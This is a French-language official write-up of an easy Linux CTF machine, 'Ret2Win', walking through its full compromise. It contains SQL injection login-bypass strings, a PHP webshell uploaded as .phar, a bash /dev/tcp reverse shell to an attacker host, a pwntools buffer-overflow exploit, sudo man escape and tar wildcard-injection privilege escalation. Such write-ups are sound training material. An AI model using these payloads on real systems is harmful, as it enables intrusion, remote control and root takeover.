# Writeup Officiel — Ret2Win
**Difficulté :** Easy | **OS :** Linux (Ubuntu 20.04) | **Plateforme :** creed-ctf.fr
> *"Un développeur pressé a laissé des traces. À toi de les suivre."*

---

## Chemin d'exploitation

```
nmap → gobuster → SQLi Login Bypass (Flag1)
→ Register admin'-- → profile.php (Flag2)
→ PHAR Upload → Shell www-data
→ sudo man → alex
→ Chemin A : Buffer Overflow port 4444 → root (Flag3 + Flag4)
→ Chemin B : Wildcard Injection → root (Flag4)
```

---

## Récap des flags

| Flag | Vulnérabilité | Valeur |
|------|--------------|--------|
| 🏴 Flag 1 | SQLi Classique | `FLAG1{Hidden}` |
| 🏴 Flag 2 | Second Order SQLi | `FLAG2{Hidden}` |
| 🏴 Flag 3 | Buffer Overflow | `FLAG3{Hidden}` |
| 🏴 Flag 4 | Wildcard Injection / BoF | `FLAG4{Hidden}` |

---

## 1. Reconnaissance

### Scan Nmap

```bash
nmap -sV -sC -p- <IP>
```

**Résultats :**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache 2.4.41
4444/tcp open  unknown
```

### Enumération Web

Le mot `creed` est présent dans la wordlist `directory-list-1.0.txt` de dirbuster :

```bash
cat /usr/share/wordlists/dirbuster/directory-list-1.0.txt | grep creed
# creed
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

On découvre le répertoire `/creed`. On énumère plus en détail :

```bash
gobuster dir -u http://<IP>/creed -w /usr/share/wordlists/dirb/common.txt
```

**Résultats :**

```
/index.php
/login.php
/register.php
/profile.php
/dashboard.php
/logout.php
/uploads/
```

---

## 2. Flag 1 — SQLi Classique (Login Bypass)

On visite `http://<IP>/creed` et on trouve une page de login. On teste une injection SQL classique dans le champ username :

```
Username: admin' or '1'='1'-- -
Password: anything
```

> **Explication :** La requête SQL devient :
> ```sql
> SELECT * FROM users 
> WHERE username='admin' or '1'='1'-- -' 
> AND password='anything'
> ```
> Le password est échappé mais le username ne l'est pas — le `or '1'='1'` est toujours vrai et le `-- -` commente le reste → bypass du login.

Le dashboard s'affiche avec le **Flag 1** et un formulaire d'upload :

<details>
<summary>🏴 Afficher le Flag 1</summary>

`FLAG1{Hidden}`

</details>

---

## 3. Flag 2 — Second Order SQLi

### Étape 1 — Register avec un username malveillant

On remarque la page `/register.php`. On crée un compte avec un username malveillant :

```
Username: admin'--
Password: test123
Email:    test@test.com
```

### Étape 2 — Login

On se connecte avec ce compte :

```
Username: admin'--
Password: test123
```

> **Note :** Le login utilise `mysqli_real_escape_string` pour la table `members` — le username est donc échappé à la connexion. Mais il est stocké tel quel en base de données !

### Étape 3 — Visite du profil

On visite manuellement `/profile.php` :

```
http://<IP>/creed/profile.php
```

> **Explication :** L'application récupère le username depuis la base de données et détecte la présence de `'` et `--` → elle exécute une requête SQL séparée pour récupérer le Flag 2. C'est le **Second Order SQLi** — l'injection est stockée puis exécutée plus tard !

<details>
<summary>🏴 Afficher le Flag 2</summary>

`FLAG2{Hidden}`

</details>

---

## 4. Shell www-data — PHAR File Upload

### Étape 1 — Découverte de l'upload

Après le bypass SQLi (Flag 1), on remarque un formulaire d'upload sur le dashboard. L'application bloque `.php` mais oublie `.phar` !

### Étape 2 — Création du webshell PHAR

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.phar
```

On upload `shell.phar` via le dashboard et on teste :

```
http://<IP>/creed/uploads/shell.phar?cmd=id
# uid=33(www-data) gid=33(www-data)
```

### Étape 3 — Reverse Shell

Sur Kali, on ouvre un listener :

```bash
nc -lvnp 4445
```

On déclenche le reverse shell via le webshell :

```
http://<IP>/creed/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<KALI_IP>/4445+0>%261'
```

Shell `www-data` obtenu ! ✅

### Étape 4 — Upgrade du shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## 5. Lateral Movement — www-data → alex

### Étape 1 — Enumération sudo

```bash
sudo -l
# (alex) NOPASSWD: /usr/bin/man
```

`www-data` peut exécuter `man` en tant que `alex` sans mot de passe !

### Étape 2 — Téléchargement d'outils

Avant de switcher vers `alex`, on télécharge les outils depuis `www-data` :

```bash
curl http://<KALI_IP>:8000/linpeas.sh -o /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

### Étape 3 — Exploitation de man (GTFOBins)

```bash
sudo -u alex man man
```

Dans l'interface man, on tape :

```
!/bin/bash
```

Shell `alex` obtenu ! ✅

```bash
id
# uid=1000(alex) gid=1000(alex) groups=1000(alex)
```

---

## 6. Flag 3 — Buffer Overflow (Port 4444)

### Étape 1 — Récupération du binaire

Depuis le shell `alex`, on copie le binaire vers le dossier web :

```bash
cp /opt/creed-bof/service /var/www/html/creed/uploads/
```

Depuis Kali :

```bash
wget http://<IP>/creed/uploads/service
chmod +x service
```

### Étape 2 — Vérification des protections

```bash
checksec --file=service
```

```
RELRO    STACK CANARY   NX    PIE
Partial  No Canary      No    No
```

Aucune protection ! ✅

### Étape 3 — Analyse avec GDB

```bash
gdb ./service
```

**Trouver l'offset :**

```gdb
run <<< $(python3 -c "print('A'*76 + 'B'*4 + 'C'*4)")
info registers eip
# eip = 0x42424242 → offset = 76 ✅
```

**Trouver l'adresse de secret() :**

```gdb
print &secret
# $1 = 0x8049216
```

**Vérifier la fonction secret() :**

```gdb
disassemble secret
# appelle system("/bin/bash") ✅
```

### Étape 4 — Exploit pwntools

```python
from pwn import *

host = "<IP>"
port = 4444
offset = 76
secret_addr = p32(0x8049216)

payload = b"A" * offset + secret_addr

conn = remote(host, port)
conn.recvuntil(b"Enter your name: ")
conn.sendline(payload)
conn.interactive()
```

```bash
python3 exploit.py
```

**Résultat :**

```
[+] Opening connection to <IP> on port 4444: Done
[*] Switching to interactive mode
# id
uid=1000(alex) gid=1000(alex) euid=0(root) ✅
```

Le binaire est **SUID root** — on obtient directement `euid=0(root)` !

```bash
cat /opt/creed-bof/flag3.txt
```

<details>
<summary>🏴 Afficher le Flag 3</summary>

`FLAG3{Hidden}`

</details>

---

## 7. Flag 4 — Deux chemins vers Root

### ⚡ Chemin A — Via Buffer Overflow (direct root)

Depuis le shell obtenu via le BoF, on a déjà `euid=0(root)` grâce au SUID :

```bash
cat /root/root.txt
```

<details>
<summary>🏴 Afficher le Flag 4</summary>

`FLAG4{Hidden}`

</details>

---

### 🔧 Chemin B — Via Wildcard Injection

#### Étape 1 — Enumération des cron jobs

```bash
cat /etc/crontab
# * * * * * root /usr/local/bin/backup.sh

cat /usr/local/bin/backup.sh
```

```bash
#!/bin/bash
cd /opt/backup
tar -czf /tmp/backup.tar.gz *
```

#### Étape 2 — Identifier la vulnérabilité

Le wildcard `*` dans `tar` est exploitable ! On vérifie qu'on peut écrire dans `/opt/backup/` :

```bash
ls -la /opt/
# drwxrwx--- root alex → writable par alex ! ✅
```

#### Étape 3 — Exploitation

```bash
cd /opt/backup

# Script malveillant
echo 'cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Fichiers spéciaux qui trompent tar
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
```

> **Explication :** Quand tar exécute `tar -czf /tmp/backup.tar.gz *`, le wildcard `*` est remplacé par tous les fichiers du dossier, y compris `--checkpoint=1` et `--checkpoint-action=exec=sh shell.sh` qui sont interprétés comme des **options tar** — exécutant ainsi `shell.sh` en tant que root !

#### Étape 4 — Attendre le cron

```bash
watch -n 1 ls -la /tmp/rootbash
# Après 1 minute :
# -rwsr-xr-x 1 root root ... /tmp/rootbash ✅
```

#### Étape 5 — Root !

```bash
/tmp/rootbash -p
id
# uid=1000(alex) euid=0(root) ✅
cat /root/root.txt
```

<details>
<summary>🏴 Afficher le Flag 4</summary>

`FLAG4{Hidden}`

</details>

---

*creed-ctf.fr — Writeup Officiel Ret2Win*
